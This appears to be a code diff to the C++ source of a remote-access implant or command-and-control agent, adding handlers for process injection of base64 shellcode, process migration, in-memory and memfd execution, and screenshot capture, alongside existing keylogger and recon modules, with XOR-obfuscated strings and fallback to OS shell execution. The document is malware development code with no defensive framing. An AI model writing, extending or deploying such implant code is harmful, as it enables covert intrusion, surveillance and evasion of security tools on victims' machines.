@@ -22,6 +22,8 @@
 #else
     #include <unistd.h>
     #include <sys/utsname.h>
+    #include <sys/types.h>
+    #include <sys/wait.h>
     #include <fstream>
     #include <chrono>
     #include <thread>
@@ -42,6 +44,12 @@
 #include "recon.h"
 #include "portfwd.h"
 #include "keylogger.h"
+
+#ifdef _WIN32
+#include "injection.h"
+#include "screenshot.h"
+#endif
+#include "inmemory.h"
 
 // ── Minimal JSON Parser ────────────────────────────────────────────────────
 // We avoid pulling in nlohmann/json to keep the binary tiny.
@@ -390,6 +398,51 @@ std::string dispatch_command(const std::string& cmd) {
     else if (action == XOR_DEC(XOR_STR("exit")).c_str() || action == XOR_DEC(XOR_STR("kill")).c_str()) {
         return XOR_DEC(XOR_STR("EXIT")).c_str();
     }
+#ifdef _WIN32
+    else if (action == XOR_DEC(XOR_STR("inject")).c_str()) {
+        DWORD pid;
+        std::string b64code;
+        if (iss >> pid >> b64code) {
+            auto code = crypto::base64_decode(b64code);
+            if (injection::inject_shellcode(pid, code)) return XOR_DEC(XOR_STR("Successfully injected into PID ")).c_str() + std::to_string(pid);
+            return XOR_DEC(XOR_STR("Injection failed.")).c_str();
+        }
+        return XOR_DEC(XOR_STR("Usage: inject <pid> <base64_shellcode>")).c_str();
+    }
+    else if (action == XOR_DEC(XOR_STR("migrate")).c_str()) {
+        std::string b64code;
+        if (iss >> b64code) {
+            auto code = crypto::base64_decode(b64code);
+            if (injection::migrate_to_new_process(code)) return XOR_DEC(XOR_STR("Successfully migrated to new process.")).c_str();
+            return XOR_DEC(XOR_STR("Migration failed.")).c_str();
+        }
+        return XOR_DEC(XOR_STR("Usage: migrate <base64_shellcode>")).c_str();
+    }
+    else if (action == XOR_DEC(XOR_STR("mem-run")).c_str()) {
+        std::string b64code;
+        if (iss >> b64code) {
+            auto code = crypto::base64_decode(b64code);
+            if (inmemory::run_shellcode(code)) return XOR_DEC(XOR_STR("Shellcode executed in memory.")).c_str();
+            return XOR_DEC(XOR_STR("In-memory execution failed.")).c_str();
+        }
+        return XOR_DEC(XOR_STR("Usage: mem-run <base64_shellcode>")).c_str();
+    }
+#else
+    else if (action == XOR_DEC(XOR_STR("mem-run")).c_str()) {
+        std::string b64bin;
+        if (iss >> b64bin) {
+            auto bin = crypto::base64_decode(b64bin);
+            if (inmemory::run_binary(bin)) return XOR_DEC(XOR_STR("Binary executed via memfd.")).c_str();
+            return XOR_DEC(XOR_STR("Memfd execution failed.")).c_str();
+        }
+        return XOR_DEC(XOR_STR("Usage: mem-run <base64_binary>")).c_str();
+    }
+#endif
+#ifdef _WIN32
+    else if (action == XOR_DEC(XOR_STR("screenshot")).c_str()) {
+        return screenshot::capture();
+    }
+#endif
 
     // Unknown built-in: execute as OS shell command (C2 interact mode)
     return run_shell_command(cmd);
